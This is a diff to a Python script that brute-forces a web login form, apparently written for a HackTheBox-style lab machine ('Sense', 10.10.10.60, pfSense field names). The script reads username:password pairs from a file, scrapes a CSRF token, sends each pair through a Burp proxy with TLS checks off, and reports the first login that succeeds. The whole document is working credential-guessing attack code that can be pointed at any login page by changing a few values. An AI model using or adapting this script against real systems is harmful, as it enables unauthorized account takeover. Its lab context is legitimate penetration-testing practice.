@@ -1,4 +1,3 @@
-#!/usr/bin/python3
 #Library to create HTTP requests, parse HTTP responses, and scrap HTTP pages for content
 import requests
 from requests.packages.urllib3.exceptions import InsecureRequestWarning
@@ -17,13 +16,18 @@ import argparse
 import os
 
 ##Change these values to suit the situation.
-var_creds = 'file/path/to/user/pass/file.txt'
-var_URL = 'http://1.1.1.1/'
-var_csrf_token_name = 'Name of tag in HTML that has the CSRF token in it'
-var_session_id = 'Name of session ID variable in HTTP header like PHPSESSID'
-var_user = 'Name of username parameter passed in HTTP POST'
-var_password = 'Name of password parameter passed in HTTP POST'
-var_keyword = 'Keyword in HTTP Response HTML which indicates the login failed'
+var_creds = '/root/Boxes/Sense/enumerate/User_Pass.txt'
+var_URL = 'https://10.10.10.60/'
+var_csrf_token_name = '__csrf_magic'
+var_session_id = 'PHPSESSID'
+var_user = 'usernamefld'
+var_password = 'passwordfld'
+var_keyword = 'incorrect'
+#Don't usually have to change var_proxy as it's set up to go through default Burp ports.
+var_proxy = {
+    "http": "http://127.0.0.1:8080",
+    "https": "http://127.0.0.1:8080"
+    }
 
 #Accessing the username:password text file   
 up_file = open(var_creds,"r")
@@ -35,19 +39,43 @@ requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 #Iterate through the username:password text file.   
 for Login_Combo in up_file:
 
-    #Split the line into an array called "fields" using the ":" as a separator.
-    fields = Login_Combo.split(":")   
-    #Extract the username and password from the colon seperated file and assign them to different columns of the array.   
-    File_User = fields[0]   
-    File_Password = fields[1]   
-
-  csrf_response = requests.get(var_URL, verify=False, allow_redirects=True)
+  #Split the line into an array called "fields" using the ":" as a separator.
+  fields = Login_Combo.split(":")   
+  #Extract the username and password from the colon seperated file and assign them to different columns of the array.   
+  File_User = fields[0]   
+  File_Password = fields[1]   
+  #Get the website to generate a CSRF token to scrape.
+  csrf_response = requests.get(
+          var_URL,
+          verify=False,
+          allow_redirects=True,
+          proxies=var_proxy
+          )
+  #Scrap the CSRF token.
   soup = BeautifulSoup(csrf_response.content, 'html.parser')
-  for result in soup.find_all(attrs={"name":var_csrf_token_name}):
+  for result in soup.find_all(attrs={"name":var_csrf_token_name}): ##You may have to change this find_all attributes to scrape the CSRF token correctly.
     token = result.get('value')
-  auth_cookie = {var_session_id: requests.utils.dict_from_cookiejar(csrf_response.cookies)[var_session_id]}
-  login_parameter_values = {var_user: File_User, var_password: File_Password[:-1], var_csrf_token_name: token}
-  r = s.post(var_URL, data=login_parameter_values, verify=False, cookies=auth_cookie, allow_redirects=True)
+  #Store the cookie value for future login attempts.
+  auth_cookie = {
+          var_session_id: requests.utils.dict_from_cookiejar(csrf_response.cookies)[var_session_id]
+          }
+  #Put in all of the POST data variables here to show up in an authentic POST attempt.
+  login_parameter_values = {
+          var_user: File_User,
+          var_password: File_Password[:-1],
+          '__csrf_magic': token,
+          'login':'Login'
+	  ##Any other POST variables / values that you see in an authentic POST attempt.
+          }
+  #Make the POST request.
+  r = requests.post(
+          var_URL,
+          data=login_parameter_values,
+          verify=False,
+          cookies=auth_cookie,
+          allow_redirects=True,
+          proxies=var_proxy
+          )
   
   #After making the POST request with a username and password combination, scrap the HTTP response packet to identify if the keyword for failed logins is present or not.
   if var_keyword in r.text: 
@@ -56,9 +84,9 @@ for Login_Combo in up_file:
 	  #Clear the cookies of the browser client used by the requests library before trying to authenticate again.
     s.cookies.clear 
   else: 
-	  #If the failed login attempt keyword is NOT found, then the login attempt was presumed to be successfull.  Print the assumed success username:password combination, indent from the failed login attempt CLI output, and color it in green text color to stand out.
+    #If the failed login attempt keyword is NOT found, then the login attempt was presumed to be successfull.  Print the assumed success username:password combination, indent from the failed login attempt CLI output, and color it in green text color to stand out.
     print(Fore.GREEN + "+++++++++++++++++++++Success %s:%s" % (File_User,File_Password[:-1]) + Style.RESET_ALL)
-	  break
+    break
 
 #It is good practice to close the files at the end to free up resources      
 up_file.close()
